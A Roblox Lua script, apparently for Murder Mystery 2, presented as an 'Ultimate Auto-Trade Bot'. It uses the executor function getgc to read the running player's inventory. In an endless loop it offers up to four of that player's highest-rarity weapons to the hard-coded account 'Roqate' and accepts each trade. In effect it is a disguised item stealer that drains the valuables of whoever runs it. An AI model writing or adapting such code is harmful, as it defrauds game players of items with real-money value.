-- Ultimate Auto-Trade Bot (Rarity Filtered)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Settings
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 5
local ITEM_ADD_DELAY = 0.3

-- Allowed rarities
local ALLOWED_RARITIES = {
    Godly = true,
    Ancient = true,
    Unique = true,
    Classic = true
}

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

local isTrading = false
local lastTradeTime = 0

-- Find player
local function findPlayer(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == name:lower() then
            return player
        end
    end
    return nil
end

-- Check if Trade GUI is open
local function isTradeGUIOpen()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- Fetch MyInventory
local function getMyInventoryModule()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            return module.MyInventory
        end
    end
    return nil
end

-- Collect best weapons
local function getBestWeapons()
    local result = {}
    local inv = getMyInventoryModule()
    if not inv or not inv.Data or not inv.Data.Weapons then
        warn("❌ No inventory weapons found!")
        return result
    end

    for categoryName, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(result, weaponName)
                    if #result >= MAX_ITEMS_PER_TRADE then
                        return result -- stop early if we reached trade limit
                    end
                end
            end
        end
    end

    return result
end

-- Add weapons to trade
local function addWeaponsToTrade()
    local weapons = getBestWeapons()
    if #weapons == 0 then
        warn("No valid high-rarity weapons found!")
        return false
    end

    for _, weapon in ipairs(weapons) do
        TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end

    return true
end

-- Accept trade
local function acceptTrade()
    if not isTradeGUIOpen() then
        warn("Trade GUI not open!")
        return false
    end
    TradeRemotes.AcceptTrade:FireServer(285646582)
    return true
end

-- Full trade flow
local function initiateTrade(targetPlayer)
    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then return end

    isTrading = true
    print("🔄 Starting trade with " .. targetPlayer.Name .. "...")

    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)

    if not success then
        warn("Trade request failed: " .. err)
        isTrading = false
        return
    end

    task.wait(1)

    if not isTradeGUIOpen() then
        warn("Trade GUI didn't open!")
        isTrading = false
        return
    end

    if not addWeaponsToTrade() then
        warn("No valid weapons to trade!")
        isTrading = false
        return
    end

    if acceptTrade() then
        print("✅ Trade with " .. targetPlayer.Name .. " completed!")
    else
        warn("Failed to accept trade!")
    end

    isTrading = false
    lastTradeTime = os.time()
end

-- Main loop
while true do
    local target = findPlayer(TARGET_PLAYER)
    if target then
        initiateTrade(target)
    else
        print(TARGET_PLAYER .. " not found. Waiting...")
    end
    task.wait(5)
end
